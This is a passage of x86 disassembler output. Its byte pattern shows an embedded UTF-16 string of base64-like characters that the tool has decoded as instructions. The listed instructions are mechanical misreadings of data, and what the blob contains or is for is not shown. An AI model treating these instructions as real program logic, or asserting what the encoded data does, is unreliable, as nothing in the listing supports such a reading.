  40af51:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40af55:	00 62 00             	add    %ah,0x0(%edx)
  40af58:	6f                   	outsl  %ds:(%esi),(%dx)
  40af59:	00 48 00             	add    %cl,0x0(%eax)
  40af5c:	63 00                	arpl   %eax,(%eax)
  40af5e:	4e                   	dec    %esi
  40af5f:	00 4e 00             	add    %cl,0x0(%esi)
  40af62:	78 00                	js     0x40af64
  40af64:	70 00                	jo     0x40af66
  40af66:	30 00                	xor    %al,(%eax)
  40af68:	61                   	popa
  40af69:	00 43 00             	add    %al,0x0(%ebx)
  40af6c:	69 00 32 00 48 00    	imul   $0x480032,(%eax),%eax
  40af72:	50                   	push   %eax
  40af73:	00 6b 00             	add    %ch,0x0(%ebx)
  40af76:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40af7a:	70 00                	jo     0x40af7c
  40af7c:	73 00                	jae    0x40af7e
  40af7e:	5a                   	pop    %edx
  40af7f:	00 4d 00             	add    %cl,0x0(%ebp)
  40af82:	47                   	inc    %edi
  40af83:	00 68 00             	add    %ch,0x0(%eax)
  40af86:	30 00                	xor    %al,(%eax)
  40af88:	45                   	inc    %ebp
  40af89:	00 75 00             	add    %dh,0x0(%ebp)
  40af8c:	62 00                	bound  %eax,(%eax)
  40af8e:	43                   	inc    %ebx
  40af8f:	00 6b 00             	add    %ch,0x0(%ebx)
  40af92:	63 00                	arpl   %eax,(%eax)
  40af94:	59                   	pop    %ecx
  40af95:	00 6a 00             	add    %ch,0x0(%edx)
  40af98:	39 00                	cmp    %eax,(%eax)
  40af9a:	67 00 2b             	add    %ch,(%bp,%di)
  40af9d:	00 4f 00             	add    %cl,0x0(%edi)
  40afa0:	2b 00                	sub    (%eax),%eax
  40afa2:	30 00                	xor    %al,(%eax)
  40afa4:	6e                   	outsb  %ds:(%esi),(%dx)
  40afa5:	00 37                	add    %dh,(%edi)
  40afa7:	00 46 00             	add    %al,0x0(%esi)
  40afaa:	50                   	push   %eax
  40afab:	00 74 00 4e          	add    %dh,0x4e(%eax,%eax,1)
  40afaf:	00 55 00             	add    %dl,0x0(%ebp)
  40afb2:	34 00                	xor    $0x0,%al
  40afb4:	7a 00                	jp     0x40afb6
  40afb6:	44                   	inc    %esp
  40afb7:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40afbb:	00 6b 00             	add    %ch,0x0(%ebx)
  40afbe:	51                   	push   %ecx
  40afbf:	00 6f 00             	add    %ch,0x0(%edi)
  40afc2:	57                   	push   %edi
  40afc3:	00 6f 00             	add    %ch,0x0(%edi)
  40afc6:	51                   	push   %ecx
  40afc7:	00 69 00             	add    %ch,0x0(%ecx)
  40afca:	63 00                	arpl   %eax,(%eax)
  40afcc:	73 00                	jae    0x40afce
  40afce:	69 00 6c 00 4d 00    	imul   $0x4d006c,(%eax),%eax
  40afd4:	57                   	push   %edi
  40afd5:	00 69 00             	add    %ch,0x0(%ecx)
  40afd8:	32 00                	xor    (%eax),%al
  40afda:	70 00                	jo     0x40afdc
  40afdc:	47                   	inc    %edi
  40afdd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40afe0:	33 00                	xor    (%eax),%eax
  40afe2:	67 00 48 00          	add    %cl,0x0(%bx,%si)
  40afe6:	36 00 32             	add    %dh,%ss:(%edx)
  40afe9:	00 54 00 65          	add    %dl,0x65(%eax,%eax,1)
  40afed:	00 5a 00             	add    %bl,0x0(%edx)
  40aff0:	4a                   	dec    %edx
  40aff1:	00 37                	add    %dh,(%edi)
  40aff3:	00 76 00             	add    %dh,0x0(%esi)
  40aff6:	61                   	popa
  40aff7:	00 6d 00             	add    %ch,0x0(%ebp)
  40affa:	69 00 33 00 65 00    	imul   $0x650033,(%eax),%eax
  40b000:	5a                   	pop    %edx
  40b001:	00 74 00 44          	add    %dh,0x44(%eax,%eax,1)
  40b005:	00 38                	add    %bh,(%eax)
  40b007:	00 71 00             	add    %dh,0x0(%ecx)
  40b00a:	58                   	pop    %eax
  40b00b:	00 2b                	add    %ch,(%ebx)
  40b00d:	00 36                	add    %dh,(%esi)
  40b00f:	00 64 00 55          	add    %ah,0x55(%eax,%eax,1)
  40b013:	00 64 00 4a          	add    %ah,0x4a(%eax,%eax,1)
  40b017:	00 35 00 67 00 34    	add    %dh,0x34006700
  40b01d:	00 66 00             	add    %ah,0x0(%esi)
  40b020:	38 00                	cmp    %al,(%eax)
  40b022:	38 00                	cmp    %al,(%eax)
  40b024:	2f                   	das
  40b025:	00 48 00             	add    %cl,0x0(%eax)
  40b028:	31 00                	xor    %eax,(%eax)
  40b02a:	59                   	pop    %ecx
  40b02b:	00 6b 00             	add    %ch,0x0(%ebx)
  40b02e:	31 00                	xor    %eax,(%eax)
  40b030:	56                   	push   %esi
  40b031:	00 79 00             	add    %bh,0x0(%ecx)
  40b034:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b038:	52                   	push   %edx
  40b039:	00 2f                	add    %ch,(%edi)
  40b03b:	00 4a 00             	add    %cl,0x0(%edx)
  40b03e:	72 00                	jb     0x40b040
  40b040:	77 00                	ja     0x40b042
  40b042:	31 00                	xor    %eax,(%eax)
  40b044:	45                   	inc    %ebp
  40b045:	00 62 00             	add    %ah,0x0(%edx)
  40b048:	69 00 35 00 46 00    	imul   $0x460035,(%eax),%eax
  40b04e:	38 00                	cmp    %al,(%eax)
  40b050:	4b                   	dec    %ebx
  40b051:	00 45 00             	add    %al,0x0(%ebp)
  40b054:	6e                   	outsb  %ds:(%esi),(%dx)
  40b055:	00 61 00             	add    %ah,0x0(%ecx)
  40b058:	68 00 50 00 44       	push   $0x44005000
  40b05d:	00 79 00             	add    %bh,0x0(%ecx)
  40b060:	31 00                	xor    %eax,(%eax)
  40b062:	42                   	inc    %edx
  40b063:	00 56 00             	add    %dl,0x0(%esi)
  40b066:	38 00                	cmp    %al,(%eax)
  40b068:	4d                   	dec    %ebp
  40b069:	00 68 00             	add    %ch,0x0(%eax)
  40b06c:	49                   	dec    %ecx
  40b06d:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40b071:	00 4c 00 7a          	add    %cl,0x7a(%eax,%eax,1)
  40b075:	00 4a 00             	add    %cl,0x0(%edx)
  40b078:	6e                   	outsb  %ds:(%esi),(%dx)
  40b079:	00 77 00             	add    %dh,0x0(%edi)
  40b07c:	6a 00                	push   $0x0
  40b07e:	66 00 4f 00          	data16 add %cl,0x0(%edi)
  40b082:	6d                   	insl   (%dx),%es:(%edi)
  40b083:	00 48 00             	add    %cl,0x0(%eax)
  40b086:	2b 00                	sub    (%eax),%eax
  40b088:	58                   	pop    %eax
  40b089:	00 75 00             	add    %dh,0x0(%ebp)
  40b08c:	47                   	inc    %edi
  40b08d:	00 61 00             	add    %ah,0x0(%ecx)
  40b090:	36 00 67 00          	add    %ah,%ss:0x0(%edi)
  40b094:	48                   	dec    %eax
  40b095:	00 50 00             	add    %dl,0x0(%eax)
  40b098:	49                   	dec    %ecx
  40b099:	00 6e 00             	add    %ch,0x0(%esi)
  40b09c:	61                   	popa
  40b09d:	00 49 00             	add    %cl,0x0(%ecx)
  40b0a0:	43                   	inc    %ebx
  40b0a1:	00 30                	add    %dh,(%eax)
  40b0a3:	00 31                	add    %dh,(%ecx)
  40b0a5:	00 38                	add    %bh,(%eax)
  40b0a7:	00 45 00             	add    %al,0x0(%ebp)
  40b0aa:	64 00 6e 00          	add    %ch,%fs:0x0(%esi)
  40b0ae:	47                   	inc    %edi
  40b0af:	00 7a 00             	add    %bh,0x0(%edx)
  40b0b2:	39 00                	cmp    %eax,(%eax)
  40b0b4:	6f                   	outsl  %ds:(%esi),(%dx)
  40b0b5:	00 67 00             	add    %ah,0x0(%edi)
  40b0b8:	2f                   	das
  40b0b9:	00 6e 00             	add    %ch,0x0(%esi)
  40b0bc:	38 00                	cmp    %al,(%eax)
  40b0be:	54                   	push   %esp
  40b0bf:	00 52 00             	add    %dl,0x0(%edx)
  40b0c2:	45                   	inc    %ebp
  40b0c3:	00 59 00             	add    %bl,0x0(%ecx)
  40b0c6:	61                   	popa
  40b0c7:	00 6f 00             	add    %ch,0x0(%edi)
  40b0ca:	49                   	dec    %ecx
  40b0cb:	00 54 00 41          	add    %dl,0x41(%eax,%eax,1)
  40b0cf:	00 53 00             	add    %dl,0x0(%ebx)
  40b0d2:	4f                   	dec    %edi
  40b0d3:	00 63 00             	add    %ah,0x0(%ebx)
  40b0d6:	49                   	dec    %ecx
  40b0d7:	00 36                	add    %dh,(%esi)
  40b0d9:	00 2b                	add    %ch,(%ebx)
  40b0db:	00 70 00             	add    %dh,0x0(%eax)
  40b0de:	71 00                	jno    0x40b0e0
  40b0e0:	62 00                	bound  %eax,(%eax)
  40b0e2:	52                   	push   %edx
  40b0e3:	00 39                	add    %bh,(%ecx)
  40b0e5:	00 6c 00 38          	add    %ch,0x38(%eax,%eax,1)
  40b0e9:	00 62 00             	add    %ah,0x0(%edx)
  40b0ec:	36 00 35 00 33 00 63 	add    %dh,%ss:0x63003300
  40b0f3:	00 71 00             	add    %dh,0x0(%ecx)
  40b0f6:	31 00                	xor    %eax,(%eax)
  40b0f8:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0f9:	00 72 00             	add    %dh,0x0(%edx)
  40b0fc:	5a                   	pop    %edx
  40b0fd:	00 71 00             	add    %dh,0x0(%ecx)
  40b100:	4e                   	dec    %esi
  40b101:	00 6b 00             	add    %ch,0x0(%ebx)
  40b104:	64 00 33             	add    %dh,%fs:(%ebx)
  40b107:	00 4d 00             	add    %cl,0x0(%ebp)
  40b10a:	41                   	inc    %ecx
  40b10b:	00 58 00             	add    %bl,0x0(%eax)
  40b10e:	6a 00                	push   $0x0
  40b110:	75 00                	jne    0x40b112
  40b112:	56                   	push   %esi
  40b113:	00 54 00 37          	add    %dl,0x37(%eax,%eax,1)
  40b117:	00 32                	add    %dh,(%edx)
  40b119:	00 63 00             	add    %ah,0x0(%ebx)
  40b11c:	45                   	inc    %ebp
  40b11d:	00 45 00             	add    %al,0x0(%ebp)
  40b120:	4b                   	dec    %ebx
  40b121:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b124:	6d                   	insl   (%dx),%es:(%edi)
  40b125:	00 71 00             	add    %dh,0x0(%ecx)
  40b128:	68 00 50 00 69       	push   $0x69005000
  40b12d:	00 62 00             	add    %ah,0x0(%edx)
  40b130:	4a                   	dec    %edx
  40b131:	00 7a 00             	add    %bh,0x0(%edx)
  40b134:	65 00 71 00          	add    %dh,%gs:0x0(%ecx)
  40b138:	37                   	aaa
  40b139:	00 63 00             	add    %ah,0x0(%ebx)
  40b13c:	35 00 75 00 48       	xor    $0x48007500,%eax
  40b141:	00 4e 00             	add    %cl,0x0(%esi)
  40b144:	33 00                	xor    (%eax),%eax
  40b146:	33 00                	xor    (%eax),%eax
  40b148:	4a                   	dec    %edx
  40b149:	00 6e 00             	add    %ch,0x0(%esi)
  40b14c:	53                   	push   %ebx
  40b14d:	00 38                	add    %bh,(%eax)
  40b14f:	00 6f 00             	add    %ch,0x0(%edi)
  40b152:	48                   	dec    %eax
  40b153:	00 75 00             	add    %dh,0x0(%ebp)
  40b156:	73 00                	jae    0x40b158
  40b158:	69 00 6d 00 68 00    	imul   $0x68006d,(%eax),%eax
  40b15e:	37                   	aaa
  40b15f:	00 75 00             	add    %dh,0x0(%ebp)
  40b162:	55                   	push   %ebp
  40b163:	00 32                	add    %dh,(%edx)
  40b165:	00 4e 00             	add    %cl,0x0(%esi)
  40b168:	33 00                	xor    (%eax),%eax
  40b16a:	35 00 73 00 64       	xor    $0x64007300,%eax
  40b16f:	00 62 00             	add    %ah,0x0(%edx)
  40b172:	31 00                	xor    %eax,(%eax)
  40b174:	62 00                	bound  %eax,(%eax)
  40b176:	59                   	pop    %ecx
  40b177:	00 38                	add    %bh,(%eax)
  40b179:	00 2b                	add    %ch,(%ebx)
  40b17b:	00 68 00             	add    %ch,0x0(%eax)
  40b17e:	35 00 4d 00 32       	xor    $0x32004d00,%eax
  40b183:	00 65 00             	add    %ah,0x0(%ebp)
  40b186:	2f                   	das
  40b187:	00 33                	add    %dh,(%ebx)
  40b189:	00 39                	add    %bh,(%ecx)
  40b18b:	00 56 00             	add    %dl,0x0(%esi)
  40b18e:	46                   	inc    %esi
  40b18f:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40b193:	00 4c 00 66          	add    %cl,0x66(%eax,%eax,1)
  40b197:	00 47 00             	add    %al,0x0(%edi)
  40b19a:	49                   	dec    %ecx
  40b19b:	00 63 00             	add    %ah,0x0(%ebx)
  40b19e:	79 00                	jns    0x40b1a0
  40b1a0:	33 00                	xor    (%eax),%eax
  40b1a2:	5a                   	pop    %edx
  40b1a3:	00 51 00             	add    %dl,0x0(%ecx)
  40b1a6:	53                   	push   %ebx
  40b1a7:	00 59 00             	add    %bl,0x0(%ecx)
  40b1aa:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b1ae:	31 00                	xor    %eax,(%eax)
  40b1b0:	5a                   	pop    %edx
  40b1b1:	00 49 00             	add    %cl,0x0(%ecx)
  40b1b4:	54                   	push   %esp
  40b1b5:	00 50 00             	add    %dl,0x0(%eax)
  40b1b8:	30 00                	xor    %al,(%eax)
  40b1ba:	37                   	aaa
  40b1bb:	00 59 00             	add    %bl,0x0(%ecx)
  40b1be:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1bf:	00 58 00             	add    %bl,0x0(%eax)
  40b1c2:	38 00                	cmp    %al,(%eax)
  40b1c4:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b1c8:	39 00                	cmp    %eax,(%eax)
  40b1ca:	49                   	dec    %ecx
  40b1cb:	00 2b                	add    %ch,(%ebx)
  40b1cd:	00 78 00             	add    %bh,0x0(%eax)
  40b1d0:	46                   	inc    %esi
  40b1d1:	00 4f 00             	add    %cl,0x0(%edi)
  40b1d4:	54                   	push   %esp
  40b1d5:	00 6b 00             	add    %ch,0x0(%ebx)
  40b1d8:	79 00                	jns    0x40b1da
  40b1da:	53                   	push   %ebx
  40b1db:	00 57 00             	add    %dl,0x0(%edi)
  40b1de:	50                   	push   %eax
  40b1df:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40b1e3:	00 41 00             	add    %al,0x0(%ecx)
  40b1e6:	33 00                	xor    (%eax),%eax
  40b1e8:	67 00 6d 00          	add    %ch,0x0(%di)
  40b1ec:	52                   	push   %edx
  40b1ed:	00 4c 00 6c          	add    %cl,0x6c(%eax,%eax,1)
  40b1f1:	00 35 00 2b 00 61    	add    %dh,0x61002b00
  40b1f7:	00 7a 00             	add    %bh,0x0(%edx)
  40b1fa:	75 00                	jne    0x40b1fc
  40b1fc:	73 00                	jae    0x40b1fe
  40b1fe:	55                   	push   %ebp
  40b1ff:	00 46 00             	add    %al,0x0(%esi)
  40b202:	4b                   	dec    %ebx
  40b203:	00 70 00             	add    %dh,0x0(%eax)
  40b206:	35 00 49 00 41       	xor    $0x41004900,%eax
  40b20b:	00 4f 00             	add    %cl,0x0(%edi)
  40b20e:	4b                   	dec    %ebx
  40b20f:	00 73 00             	add    %dh,0x0(%ebx)
  40b212:	69 00 4c 00 64 00    	imul   $0x64004c,(%eax),%eax
  40b218:	57                   	push   %edi
  40b219:	00 33                	add    %dh,(%ebx)
  40b21b:	00 68 00             	add    %ch,0x0(%eax)
  40b21e:	37                   	aaa
  40b21f:	00 41 00             	add    %al,0x0(%ecx)
  40b222:	45                   	inc    %ebp
  40b223:	00 4d 00             	add    %cl,0x0(%ebp)
  40b226:	33 00                	xor    (%eax),%eax
  40b228:	62 00                	bound  %eax,(%eax)
  40b22a:	6b 00 79             	imul   $0x79,(%eax),%eax
  40b22d:	00 76 00             	add    %dh,0x0(%esi)
  40b230:	58                   	pop    %eax
  40b231:	00 67 00             	add    %ah,0x0(%edi)
  40b234:	6e                   	outsb  %ds:(%esi),(%dx)
  40b235:	00 37                	add    %dh,(%edi)
  40b237:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b23a:	73 00                	jae    0x40b23c
  40b23c:	47                   	inc    %edi
  40b23d:	00 75 00             	add    %dh,0x0(%ebp)
  40b240:	4a                   	dec    %edx
  40b241:	00 33                	add    %dh,(%ebx)
  40b243:	00 74 00 67          	add    %dh,0x67(%eax,%eax,1)
  40b247:	00 66 00             	add    %ah,0x0(%esi)
  40b24a:	32 00                	xor    (%eax),%al
  40b24c:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  40b250:	4c                   	dec    %esp
  40b251:	00 32                	add    %dh,(%edx)
  40b253:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b256:	33 00                	xor    (%eax),%eax
  40b258:	53                   	push   %ebx
  40b259:	00 43 00             	add    %al,0x0(%ebx)
  40b25c:	6c                   	insb   (%dx),%es:(%edi)
  40b25d:	00 74 00 54          	add    %dh,0x54(%eax,%eax,1)
  40b261:	00 66 00             	add    %ah,0x0(%esi)
  40b264:	69 00 76 00 57 00    	imul   $0x570076,(%eax),%eax
  40b26a:	61                   	popa
  40b26b:	00 78 00             	add    %bh,0x0(%eax)
  40b26e:	69 00 4d 00 6e 00    	imul   $0x6e004d,(%eax),%eax
  40b274:	59                   	pop    %ecx
  40b275:	00 63 00             	add    %ah,0x0(%ebx)
  40b278:	57                   	push   %edi
  40b279:	00 42 00             	add    %al,0x0(%edx)
  40b27c:	59                   	pop    %ecx
  40b27d:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b280:	6d                   	insl   (%dx),%es:(%edi)
  40b281:	00 71 00             	add    %dh,0x0(%ecx)
  40b284:	66 00 76 00          	data16 add %dh,0x0(%esi)
  40b288:	45                   	inc    %ebp
  40b289:	00 51 00             	add    %dl,0x0(%ecx)
  40b28c:	42                   	inc    %edx
  40b28d:	00 58 00             	add    %bl,0x0(%eax)
  40b290:	6c                   	insb   (%dx),%es:(%edi)
  40b291:	00 39                	add    %bh,(%ecx)
  40b293:	00 75 00             	add    %dh,0x0(%ebp)
  40b296:	36 00 49 00          	add    %cl,%ss:0x0(%ecx)
  40b29a:	79 00                	jns    0x40b29c
  40b29c:	30 00                	xor    %al,(%eax)
  40b29e:	75 00                	jne    0x40b2a0
  40b2a0:	75 00                	jne    0x40b2a2
  40b2a2:	2b 00                	sub    (%eax),%eax
  40b2a4:	4b                   	dec    %ebx
  40b2a5:	00 57 00             	add    %dl,0x0(%edi)
  40b2a8:	37                   	aaa
  40b2a9:	00 77 00             	add    %dh,0x0(%edi)
  40b2ac:	61                   	popa
  40b2ad:	00 6a 00             	add    %ch,0x0(%edx)
  40b2b0:	2b 00                	sub    (%eax),%eax
  40b2b2:	57                   	push   %edi
  40b2b3:	00 37                	add    %dh,(%edi)
  40b2b5:	00 75 00             	add    %dh,0x0(%ebp)
  40b2b8:	6d                   	insl   (%dx),%es:(%edi)
  40b2b9:	00 4b 00             	add    %cl,0x0(%ebx)
  40b2bc:	64 00 4b 00          	add    %cl,%fs:0x0(%ebx)
  40b2c0:	30 00                	xor    %al,(%eax)
  40b2c2:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40b2c6:	58                   	pop    %eax
  40b2c7:	00 6e 00             	add    %ch,0x0(%esi)
  40b2ca:	6c                   	insb   (%dx),%es:(%edi)
  40b2cb:	00 47 00             	add    %al,0x0(%edi)
  40b2ce:	47                   	inc    %edi
  40b2cf:	00 36                	add    %dh,(%esi)
  40b2d1:	00 48 00             	add    %cl,0x0(%eax)
  40b2d4:	50                   	push   %eax
  40b2d5:	00 2f                	add    %ch,(%edi)
  40b2d7:	00 51 00             	add    %dl,0x0(%ecx)
  40b2da:	4e                   	dec    %esi
  40b2db:	00 4e 00             	add    %cl,0x0(%esi)
  40b2de:	4a                   	dec    %edx
  40b2df:	00 54 00 79          	add    %dl,0x79(%eax,%eax,1)
  40b2e3:	00 43 00             	add    %al,0x0(%ebx)
  40b2e6:	50                   	push   %eax
  40b2e7:	00 77 00             	add    %dh,0x0(%edi)
  40b2ea:	44                   	inc    %esp
  40b2eb:	00 33                	add    %dh,(%ebx)
  40b2ed:	00 71 00             	add    %dh,0x0(%ecx)
  40b2f0:	54                   	push   %esp
  40b2f1:	00 71 00             	add    %dh,0x0(%ecx)
  40b2f4:	63 00                	arpl   %eax,(%eax)
  40b2f6:	7a 00                	jp     0x40b2f8
  40b2f8:	4d                   	dec    %ebp
  40b2f9:	00 44 00 37          	add    %al,0x37(%eax,%eax,1)
  40b2fd:	00 37                	add    %dh,(%edi)
  40b2ff:	00 46 00             	add    %al,0x0(%esi)
  40b302:	44                   	inc    %esp
  40b303:	00 2b                	add    %ch,(%ebx)
  40b305:	00 59 00             	add    %bl,0x0(%ecx)
  40b308:	4f                   	dec    %edi
  40b309:	00 52 00             	add    %dl,0x0(%edx)
  40b30c:	55                   	push   %ebp
  40b30d:	00 42 00             	add    %al,0x0(%edx)
  40b310:	6f                   	outsl  %ds:(%esi),(%dx)
  40b311:	00 68 00             	add    %ch,0x0(%eax)
  40b314:	71 00                	jno    0x40b316
  40b316:	59                   	pop    %ecx
  40b317:	00 45 00             	add    %al,0x0(%ebp)
  40b31a:	61                   	popa
  40b31b:	00 64 00 79          	add    %ah,0x79(%eax,%eax,1)
  40b31f:	00 59 00             	add    %bl,0x0(%ecx)
  40b322:	30 00                	xor    %al,(%eax)
  40b324:	45                   	inc    %ebp
  40b325:	00 71 00             	add    %dh,0x0(%ecx)
  40b328:	68 00 78 00 68       	push   $0x68007800
  40b32d:	00 32                	add    %dh,(%edx)
  40b32f:	00 72 00             	add    %dh,0x0(%edx)
  40b332:	6b 00 7a             	imul   $0x7a,(%eax),%eax
  40b335:	00 33                	add    %dh,(%ebx)
  40b337:	00 58 00             	add    %bl,0x0(%eax)
  40b33a:	75 00                	jne    0x40b33c
  40b33c:	50                   	push   %eax
  40b33d:	00 33                	add    %dh,(%ebx)
  40b33f:	00 47 00             	add    %al,0x0(%edi)
  40b342:	47                   	inc    %edi
  40b343:	00 31                	add    %dh,(%ecx)
  40b345:	00 51 00             	add    %dl,0x0(%ecx)
  40b348:	79 00                	jns    0x40b34a
  40b34a:	37                   	aaa
  40b34b:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b34f:	00 31                	add    %dh,(%ecx)
  40b351:	00 73 00             	add    %dh,0x0(%ebx)
  40b354:	74 00                	je     0x40b356
  40b356:	49                   	dec    %ecx
  40b357:	00 51 00             	add    %dl,0x0(%ecx)
  40b35a:	7a 00                	jp     0x40b35c
  40b35c:	74 00                	je     0x40b35e
  40b35e:	2f                   	das
  40b35f:	00 2b                	add    %ch,(%ebx)
  40b361:	00 6f 00             	add    %ch,0x0(%edi)
  40b364:	78 00                	js     0x40b366
  40b366:	32 00                	xor    (%eax),%al
  40b368:	31 00                	xor    %eax,(%eax)
  40b36a:	6c                   	insb   (%dx),%es:(%edi)
  40b36b:	00 73 00             	add    %dh,0x0(%ebx)
  40b36e:	35 00 45 00 37       	xor    $0x37004500,%eax
  40b373:	00 6f 00             	add    %ch,0x0(%edi)
  40b376:	62 00                	bound  %eax,(%eax)
  40b378:	54                   	push   %esp
  40b379:	00 47 00             	add    %al,0x0(%edi)
  40b37c:	4d                   	dec    %ebp
  40b37d:	00 62 00             	add    %ah,0x0(%edx)
  40b380:	69 00 37 00 6a 00    	imul   $0x6a0037,(%eax),%eax
  40b386:	34 00                	xor    $0x0,%al
  40b388:	32 00                	xor    (%eax),%al
  40b38a:	47                   	inc    %edi
  40b38b:	00 46 00             	add    %al,0x0(%esi)
  40b38e:	6e                   	outsb  %ds:(%esi),(%dx)
  40b38f:	00 64 00 4d          	add    %ah,0x4d(%eax,%eax,1)
  40b393:	00 4b 00             	add    %cl,0x0(%ebx)
  40b396:	64 00 58 00          	add    %bl,%fs:0x0(%eax)
  40b39a:	49                   	dec    %ecx
  40b39b:	00 43 00             	add    %al,0x0(%ebx)
  40b39e:	69 00 30 00 45 00    	imul   $0x450030,(%eax),%eax
  40b3a4:	4a                   	dec    %edx
  40b3a5:	00 6a 00             	add    %ch,0x0(%edx)
  40b3a8:	77 00                	ja     0x40b3aa
  40b3aa:	6d                   	insl   (%dx),%es:(%edi)
  40b3ab:	00 35 00 71 00 4c    	add    %dh,0x4c007100
  40b3b1:	00 66 00             	add    %ah,0x0(%esi)
  40b3b4:	66 00 78 00          	data16 add %bh,0x0(%eax)
  40b3b8:	59                   	pop    %ecx
  40b3b9:	00 4b 00             	add    %cl,0x0(%ebx)
  40b3bc:	78 00                	js     0x40b3be
  40b3be:	79 00                	jns    0x40b3c0
  40b3c0:	47                   	inc    %edi
  40b3c1:	00 49 00             	add    %cl,0x0(%ecx)
  40b3c4:	75 00                	jne    0x40b3c6
  40b3c6:	42                   	inc    %edx
  40b3c7:	00 66 00             	add    %ah,0x0(%esi)
  40b3ca:	59                   	pop    %ecx
  40b3cb:	00 42 00             	add    %al,0x0(%edx)
  40b3ce:	46                   	inc    %esi
  40b3cf:	00 72 00             	add    %dh,0x0(%edx)
  40b3d2:	52                   	push   %edx
  40b3d3:	00 66 00             	add    %ah,0x0(%esi)
  40b3d6:	42                   	inc    %edx
  40b3d7:	00 62 00             	add    %ah,0x0(%edx)
  40b3da:	4e                   	dec    %esi
  40b3db:	00 2b                	add    %ch,(%ebx)
  40b3dd:	00 2f                	add    %ch,(%edi)
  40b3df:	00 67 00             	add    %ah,0x0(%edi)
  40b3e2:	72 00                	jb     0x40b3e4
  40b3e4:	61                   	popa
  40b3e5:	00 55 00             	add    %dl,0x0(%ebp)
  40b3e8:	37                   	aaa
  40b3e9:	00 48 00             	add    %cl,0x0(%eax)
  40b3ec:	77 00                	ja     0x40b3ee
  40b3ee:	71 00                	jno    0x40b3f0
  40b3f0:	6a 00                	push   $0x0
  40b3f2:	61                   	popa
  40b3f3:	00 6c 00 2f          	add    %ch,0x2f(%eax,%eax,1)
  40b3f7:	00 64 00 36          	add    %ah,0x36(%eax,%eax,1)
  40b3fb:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40b3ff:	00 2f                	add    %ch,(%edi)
  40b401:	00 6e 00             	add    %ch,0x0(%esi)
  40b404:	4a                   	dec    %edx
  40b405:	00 32                	add    %dh,(%edx)
  40b407:	00 77 00             	add    %dh,0x0(%edi)
  40b40a:	33 00                	xor    (%eax),%eax
  40b40c:	4a                   	dec    %edx
  40b40d:	00 72 00             	add    %dh,0x0(%edx)
  40b410:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40b414:	7a 00                	jp     0x40b416
  40b416:	55                   	push   %ebp
  40b417:	00 75 00             	add    %dh,0x0(%ebp)
  40b41a:	33 00                	xor    (%eax),%eax
  40b41c:	47                   	inc    %edi
  40b41d:	00 75 00             	add    %dh,0x0(%ebp)
  40b420:	37                   	aaa
  40b421:	00 2b                	add    %ch,(%ebx)
  40b423:	00 6e 00             	add    %ch,0x0(%esi)
  40b426:	4a                   	dec    %edx
  40b427:	00 35 00 4a 00 61    	add    %dh,0x61004a00
  40b42d:	00 4e 00             	add    %cl,0x0(%esi)
  40b430:	45                   	inc    %ebp
  40b431:	00 69 00             	add    %ch,0x0(%ecx)
  40b434:	59                   	pop    %ecx
  40b435:	00 6a 00             	add    %ch,0x0(%edx)
  40b438:	63 00                	arpl   %eax,(%eax)
  40b43a:	39 00                	cmp    %eax,(%eax)
  40b43c:	58                   	pop    %eax
  40b43d:	00 59 00             	add    %bl,0x0(%ecx)
  40b440:	53                   	push   %ebx
  40b441:	00 69 00             	add    %ch,0x0(%ecx)
  40b444:	4f                   	dec    %edi
  40b445:	00 76 00             	add    %dh,0x0(%esi)
  40b448:	63 00                	arpl   %eax,(%eax)
  40b44a:	50                   	push   %eax
  40b44b:	00 72 00             	add    %dh,0x0(%edx)
  40b44e:	4c                   	dec    %esp
  40b44f:	00 6d 00             	add    %ch,0x0(%ebp)
  40b452:	6f                   	outsl  %ds:(%esi),(%dx)
  40b453:	00 36                	add    %dh,(%esi)
  40b455:	00 2f                	add    %ch,(%edi)
  40b457:	00 37                	add    %dh,(%edi)
  40b459:	00 56 00             	add    %dl,0x0(%esi)
  40b45c:	6c                   	insb   (%dx),%es:(%edi)
  40b45d:	00 54 00 7a          	add    %dl,0x7a(%eax,%eax,1)
  40b461:	00 50 00             	add    %dl,0x0(%eax)
  40b464:	56                   	push   %esi
  40b465:	00 38                	add    %bh,(%eax)
  40b467:	00 30                	add    %dh,(%eax)
  40b469:	00 71 00             	add    %dh,0x0(%ecx)
  40b46c:	2f                   	das
  40b46d:	00 42 00             	add    %al,0x0(%edx)
  40b470:	45                   	inc    %ebp
  40b471:	00 79 00             	add    %bh,0x0(%ecx)
  40b474:	4f                   	dec    %edi
  40b475:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40b479:	00 71 00             	add    %dh,0x0(%ecx)
  40b47c:	69 00 68 00 34 00    	imul   $0x340068,(%eax),%eax
  40b482:	79 00                	jns    0x40b484
  40b484:	30 00                	xor    %al,(%eax)
  40b486:	6b 00 50             	imul   $0x50,(%eax),%eax
  40b489:	00 77 00             	add    %dh,0x0(%edi)
  40b48c:	31 00                	xor    %eax,(%eax)
  40b48e:	63 00                	arpl   %eax,(%eax)
  40b490:	67 00 67 00          	add    %ah,0x0(%bx)
  40b494:	48                   	dec    %eax
  40b495:	00 67 00             	add    %ah,0x0(%edi)
  40b498:	38 00                	cmp    %al,(%eax)
  40b49a:	42                   	inc    %edx
  40b49b:	00 42 00             	add    %al,0x0(%edx)
  40b49e:	73 00                	jae    0x40b4a0
  40b4a0:	45                   	inc    %ebp
  40b4a1:	00 31                	add    %dh,(%ecx)
  40b4a3:	00 57 00             	add    %dl,0x0(%edi)
